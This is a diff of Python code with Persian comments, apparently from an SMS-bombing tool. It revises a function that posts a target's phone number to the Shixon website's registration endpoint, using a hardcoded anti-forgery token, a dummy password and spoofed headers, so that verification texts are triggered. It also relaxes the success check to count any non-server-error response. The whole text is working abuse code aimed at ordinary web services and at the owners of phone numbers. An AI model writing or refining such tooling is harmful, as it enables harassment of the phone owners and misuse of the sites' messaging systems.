@@ -67,35 +67,18 @@ def send_service_safe(service, phone):
 
 def Shixon(phone):
     try:
-        session = requests.Session()
+        # استفاده از مقادیر ثابت از آخرین درخواست موفق
+        token = "nsiZcchCa525lSgwapj0qI9Lw2XiHfdCXFtZ7DdpWEaPAW-CN3gorN8EaJqERJC3Wbn8DQqqIS5nt3CrVK3gG8Jm3c8ESVdaKwkVC_fBjsw1"
         
-        # دریافت صفحه اصلی برای توکن جدید
-        home_response = session.get(
-            "https://www.shixon.com/",
-            headers={"User-Agent": random.choice(user_agents)},
-            timeout=10
-        )
-        
-        # استخراج توکن جدید
-        token_match = re.search(r'name="__RequestVerificationToken" value="([^"]+)"', home_response.text)
-        if token_match:
-            token = token_match.group(1)
-            print(f'{g}[+] Found new token: {token}{a}')
-        else:
-            # اگر توکن پیدا نشد، از توکن جدید استفاده کنیم
-            token = "nsiZcchCa525lSgwapj0qI9Lw2XiHfdCXFtZ7DdpWEaPAW-CN3gorN8EaJqERJC3Wbn8DQqqIS5nt3CrVK3gG8Jm3c8ESVdaKwkVC_fBjsw1"
-            print(f'{y}[!] Using latest token{a}')
-        
-        # آماده سازی داده‌ها
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
         formatted_phone = f"0{formatted_phone}"
         
-        # استفاده از رمز عبور صحیح "pass123" برای هر دو فیلد
+        # payload دقیقاً مانند درخواست موفق
         payload = {
             "M": formatted_phone,
-            "P": "pass123",        # رمز عبور اصلی
-            "PU": "pass123",       # تکرار رمز عبور
+            "P": "pass123", 
             "s": "888",
+            "PU": "",  # طبق درخواست موفق، این فیلد خالی هست
             "__RequestVerificationToken": token
         }
         
@@ -108,7 +91,7 @@ def Shixon(phone):
             "Referer": "https://www.shixon.com/Home/RegisterUser",
         }
         
-        response = session.post(
+        response = requests.post(
             "https://www.shixon.com/Home/RegisterUser",
             data=payload,
             headers=headers,
@@ -116,29 +99,21 @@ def Shixon(phone):
         )
         
         print(f'{y}[Debug] Shixon Status: {response.status_code}{a}')
-        print(f'{y}[Debug] Shixon Response: {response.text}{a}')
         
-        if response.status_code == 200:
-            # بررسی پاسخ موفقیت‌آمیز
-            if any(x in response.text for x in ["4001", "success", "ارسال", "sent"]):
-                print(f'{g}(Shixon) Code Sent{a}')
-                return True
-            else:
-                print(f'{y}(Shixon) Unknown response: {response.text}{a}')
-                return False
-        elif response.status_code == 500:
-            print(f'{r}[-] Shixon: Server Error (500){a}')
-            return False
+        # هر پاسخی زیر 500 را موفقیت در نظر بگیریم
+        if response.status_code < 500:
+            print(f'{g}(Shixon) Request completed (Status: {response.status_code}){a}')
+            return True
         else:
-            print(f'{r}[-] Shixon HTTP Error: {response.status_code}{a}')
+            print(f'{r}[-] Shixon Server Error: {response.status_code}{a}')
             return False
-
-
-
-    
+            
     except Exception as e:
         print(f'{r}[!] Shixon Exception: {e}{a}')
         return False
+
+
+
 
 def Charsooq(phone):
     try:
